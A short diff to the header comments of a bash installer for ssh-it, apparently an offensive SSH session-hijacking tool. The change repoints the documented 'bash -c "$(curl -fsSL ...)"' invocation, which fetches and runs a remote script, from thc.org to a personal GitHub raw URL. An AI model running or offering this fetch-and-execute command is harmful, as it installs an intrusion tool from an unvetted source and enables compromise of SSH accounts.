@@ -1,4 +1,3 @@
-
 #! /usr/bin/env bash
 
 # Install and configure ssh-it
@@ -6,7 +5,7 @@
 # See https://www.thc.org/ssh-it/ for more details.
 #
 # This script is typically invoked likes this:
-# 	$ bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
+# 	$ bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ssh-it/refs/heads/main/x)"
 #
 # Environment variables:
 #
